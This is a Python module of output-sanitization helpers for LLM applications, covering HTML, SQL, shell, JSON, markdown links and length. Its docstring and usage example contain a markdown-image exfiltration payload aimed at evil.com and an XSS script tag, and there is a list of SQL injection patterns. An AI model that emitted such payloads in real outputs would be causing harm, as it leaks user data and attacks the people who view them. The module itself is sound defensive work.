"""
Output sanitization patterns for LLM applications.

These patterns demonstrate how to validate and sanitize model outputs
before passing them to downstream systems (web, database, shell, etc.).
"""

import html
import json
import re


def sanitize_for_html(text: str) -> str:
    """Escape model output for safe HTML rendering.
    Prevents XSS from AI-generated content."""
    return html.escape(text, quote=True)


def sanitize_for_sql_context(text: str) -> str:
    """Strip SQL-like patterns from model output.

    NOTE: This is a defense-in-depth measure. Always use parameterized
    queries — never concatenate model output into SQL strings.
    """
    # Remove common SQL injection patterns
    sql_patterns = [
        r";\s*(DROP|DELETE|UPDATE|INSERT|ALTER|CREATE|EXEC)",
        r"--\s*$",
        r"UNION\s+SELECT",
        r"OR\s+1\s*=\s*1",
    ]
    for pattern in sql_patterns:
        text = re.sub(pattern, "", text, flags=re.IGNORECASE)
    return text.strip()


def sanitize_for_shell(text: str) -> str:
    """Remove shell metacharacters from model output.

    NOTE: Avoid executing model output as shell commands entirely.
    If unavoidable, use allowlists and subprocess with shell=False.
    """
    dangerous_chars = set(";|&$`\\!><(){}[]'\"\n")
    return "".join(c for c in text if c not in dangerous_chars)


def validate_json_output(text: str, max_depth: int = 5) -> dict:
    """Parse and validate JSON output from the model.
    Rejects excessively nested structures."""
    try:
        parsed = json.loads(text)
    except json.JSONDecodeError as e:
        raise ValueError(f"Model output is not valid JSON: {e}")

    def check_depth(obj, current_depth=0):
        if current_depth > max_depth:
            raise ValueError(
                f"JSON nesting exceeds maximum depth of {max_depth}"
            )
        if isinstance(obj, dict):
            for v in obj.values():
                check_depth(v, current_depth + 1)
        elif isinstance(obj, list):
            for item in obj:
                check_depth(item, current_depth + 1)

    check_depth(parsed)
    return parsed


def strip_markdown_links(text: str) -> str:
    """Remove markdown links from model output to prevent
    exfiltration via image/link rendering.

    Blocks patterns like ![](https://evil.com/steal?data=SECRET)
    """
    # Remove markdown images
    text = re.sub(r"!\[([^\]]*)\]\([^)]+\)", r"\1", text)
    # Remove markdown links (keep link text)
    text = re.sub(r"\[([^\]]*)\]\([^)]+\)", r"\1", text)
    return text


def validate_output_length(text: str, max_chars: int = 50000) -> str:
    """Enforce maximum output length."""
    if len(text) > max_chars:
        return text[:max_chars] + "\n[Output truncated]"
    return text


def sanitize_model_output(
    text: str,
    context: str = "text",
    max_chars: int = 50000,
) -> str:
    """Full sanitization pipeline for model output.

    Args:
        text: Raw model output
        context: Target context — "html", "text", or "shell"
        max_chars: Maximum output length
    """
    text = validate_output_length(text, max_chars)
    text = strip_markdown_links(text)

    if context == "html":
        text = sanitize_for_html(text)
    elif context == "shell":
        text = sanitize_for_shell(text)

    return text


# Usage example
if __name__ == "__main__":
    model_output = (
        'Here is the result: <script>alert("xss")</script> '
        "and a link ![img](https://evil.com/steal?d=secret)"
    )
    safe_html = sanitize_model_output(model_output, context="html")
    safe_text = sanitize_model_output(model_output, context="text")
    print(f"HTML-safe: {safe_html}")
    print(f"Text-safe: {safe_text}")
